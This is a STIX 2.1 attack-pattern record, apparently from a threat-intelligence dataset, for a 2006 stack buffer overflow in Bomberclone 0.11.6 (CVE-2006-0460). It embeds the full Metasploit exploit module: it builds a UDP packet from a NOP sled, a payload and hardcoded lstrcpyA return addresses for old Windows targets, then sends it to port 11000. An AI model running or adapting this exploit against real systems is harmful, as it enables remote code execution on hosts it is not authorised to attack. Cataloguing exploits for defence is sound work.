{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fb414e0-fc89-47f7-854e-cbaf3e02f4c0",
    "created": "2024-08-14T16:46:39.90108Z",
    "modified": "2024-08-14T16:46:39.901084Z",
    "name": "Bomberclone 0.11.6 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows. The return address is overwritten with lstrcpyA memory address the second and third value are the destination buffer the fourth value is the source address of our buffer in the stack. This exploit is like a return in libc.  ATTENTION The shellcode is exec ONLY when someone try to close bomberclone. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bomberclone_overflow.rb",
            "external_id": "bomberclone_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0460"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Bomberclone 0.11.6 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows.\n        The return address is overwritten with lstrcpyA memory address,\n        the second and third value are the destination buffer,\n        the fourth value is the source address of our buffer in the stack.\n        This exploit is like a return in libc.\n\n        ATTENTION\n        The shellcode is exec ONLY when someone try to close bomberclone.\n      },\n      'Author'         => 'Jacopo Cervini <acaro[at]jervus.it>',\n      'References'     =>\n        [\n          ['CVE', '2006-0460'],\n          ['OSVDB', '23263'],\n          ['BID', '16697']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 344,\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows XP SP2 Italian',   { 'Ret' => 0x7c80c729, } ], # kernel32!lstrcpyA\n          ['Windows 2000 SP1 English', { 'Ret' => 0x77e85f08, } ], # kernel32!lstrcpyA\n          ['Windows 2000 SP1 English', { 'Ret' => 0x77e95e8b, } ], # kernel32!lstrcpyA\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-02-16'\n      ))\n\n    register_options([ Opt::RPORT(11000) ])\n  end\n\n  def exploit\n    connect_udp\n\n    pattern  = make_nops(421)\n    pattern << payload.encoded\n    pattern << [ target.ret ].pack('V')\n    pattern << \"\\x04\\xec\\xfd\\x7f\" * 2\n    pattern << \"\\xa4\\xfa\\x22\\x00\"\n\n    request  = \"\\x00\\x00\\x00\\x00\\x38\\x03\\x41\" + pattern + \"\\r\\n\"\n\n    print_status(\"Trying #{target.name} using lstrcpyA address at #{\"0x%.8x\" % target.ret }...\")\n\n    udp_sock.put(request)\n    udp_sock.get(5)\n\n    handler(udp_sock)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-02-16",
    "x_mitre_platforms": [
        "win'"
    ]
}